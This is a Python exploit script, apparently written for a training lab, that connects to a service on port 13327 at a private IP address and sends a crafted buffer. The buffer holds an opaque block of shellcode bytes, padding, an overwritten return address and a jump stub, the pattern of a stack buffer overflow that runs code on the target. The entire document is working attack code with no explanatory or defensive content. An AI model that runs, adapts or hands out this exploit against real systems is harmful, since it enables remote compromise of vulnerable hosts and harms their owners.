#!/usr/bin/python3

import socket

host='192.168.56.111'

shellcode = b""
shellcode += b"\xdb\xd3\xd9\x74\x24\xf4\xbd\xa3\x01\x92\xb6\x5a\x29\xc9\xb1"
shellcode += b"\x14\x31\x6a\x19\x03\x6a\x19\x83\xc2\x04\x41\xf4\xa3\x6d\x72"
shellcode += b"\x14\x90\xd2\x2f\xb1\x15\x5c\x2e\xf5\x7c\x93\x30\xad\xde\x79"
shellcode += b"\x58\x50\xdf\x6c\xc4\x3e\xcf\xdf\xa4\x37\x0e\xb5\x22\x10\x1c"
shellcode += b"\xca\x23\xe1\x9a\x78\x37\x52\xc4\xb3\xb7\xd1\xb9\x2a\x7a\x55"
shellcode += b"\x2a\xeb\xee\x69\x15\xc1\x6e\xdc\xdc\x21\x06\xf0\x31\xa1\xbe"
shellcode += b"\x66\x61\x27\x57\x19\xf4\x44\xf7\xb6\x8f\x6a\x47\x33\x5d\xec"

buffer = b''
buffer += b'\x11(setup sound '
buffer += shellcode
buffer += b'\x41'*(4368-105)  # padding  
buffer += b'\x97\x45\x13\x08' # EIP
buffer += b'\x83\xc0\x0c\xff\xe0\x90\x90' #ESP
buffer += b'\x90\x00#'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print('Sending evil buffer...')
s.connect((host, 13327))
data=s.recv(1024)
s.send(buffer)
s.close()
print('Payload Sent')